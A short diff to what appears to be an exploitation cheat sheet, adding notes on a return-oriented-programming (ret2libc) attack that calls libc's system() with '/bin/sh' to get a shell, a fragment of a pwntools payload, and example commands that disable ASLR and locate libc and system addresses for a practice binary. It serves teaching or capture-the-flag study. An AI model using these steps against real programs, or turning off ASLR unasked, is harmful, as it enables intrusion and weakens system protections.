@@ -4,6 +4,9 @@
 ---
 
 [one gadget](https://github.com/david942j/one_gadget)
+
+ROP exploit - Return oriented programming, pass `/bin/sh` as input data for system call in libc to get shell.
+
 ```py
 NX enabled - Shellcode method cannot be used
 ASLR enabled - address space layout randomization to prevent boff attacks
@@ -55,3 +58,13 @@ payload=flat(
    binsh # Address of /bin/sh in libc
    system, # Address of system function in libc
 )
+```
+
+---
+
+#### Example
+
+```py
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+ldd vulm-32 -> grab the libc.so.* address
+readelf -s /lib32/libc.so.6 | grep system -> address of system
